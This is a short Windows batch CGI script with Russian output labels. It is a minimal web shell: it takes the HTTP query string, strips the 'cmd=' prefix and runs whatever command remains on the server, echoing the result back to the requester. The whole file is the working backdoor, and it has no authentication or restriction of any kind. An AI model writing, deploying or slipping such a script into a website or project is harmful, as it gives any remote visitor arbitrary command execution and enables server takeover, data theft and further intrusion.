@echo off
echo Content-Type: text/plain
echo.

set "cmd=%QUERY_STRING%"
set "cmd=%cmd:cmd=%"
set "cmd=%cmd:&= %"

echo Получена команда: %cmd%
echo.
echo Результат:
%cmd%